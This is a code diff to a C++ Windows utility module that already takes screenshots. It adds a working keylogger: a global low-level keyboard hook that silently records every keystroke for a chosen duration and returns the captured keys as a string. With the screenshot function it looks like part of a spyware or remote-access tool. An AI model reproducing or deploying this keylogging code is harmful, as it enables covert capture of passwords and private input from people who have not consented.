@@ -4,6 +4,7 @@
 
 #include <Windows.h>
 #include "WinUtils.h"
+#include <iostream>
 
 bool win_utils::do_popup(const std::string& window_name, const std::string& text, const DWORD flags)
 {
@@ -117,4 +118,49 @@ std::string win_utils::take_screenshot()
     return bmp_buffer;
 }
 
+BOOL win_utils::GetMessageWithTimeout(MSG* msg, UINT to)
+{
+    BOOL res;
+    UINT_PTR timerId = SetTimer(NULL, NULL, to, NULL);
+    res = GetMessage(msg, NULL, NULL, NULL);
+    KillTimer(NULL, timerId);
+    if (!res)
+        return FALSE;
+    if (msg->message == WM_TIMER && msg->hwnd == NULL && msg->wParam == timerId)
+        return FALSE;
+    return TRUE;
+}
 
+std::string win_utils::log_keys(size_t duration_seconds)
+{
+    key_logger_key_codes.clear();
+    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, win_utils::log_keys_hook, 0, 0);
+
+    MSG msg;
+    GetMessageWithTimeout(&msg, duration_seconds * 1000);
+
+    UnhookWindowsHookEx(hhkLowLevelKybd);
+
+    std::string result = "";
+    for (const DWORD val : key_logger_key_codes) {
+        result.append(std::string(1, static_cast<char>(val)));
+    }
+    return result;
+}
+
+LRESULT CALLBACK win_utils::log_keys_hook(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION)
+    {
+        switch (wParam)
+        {
+        case WM_KEYDOWN:
+        case WM_SYSKEYDOWN:
+            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
+            const auto key_code = p->vkCode;
+            key_logger_key_codes.push_back(key_code);
+            break;
+        }
+    }
+    return false; // don't consume event
+}
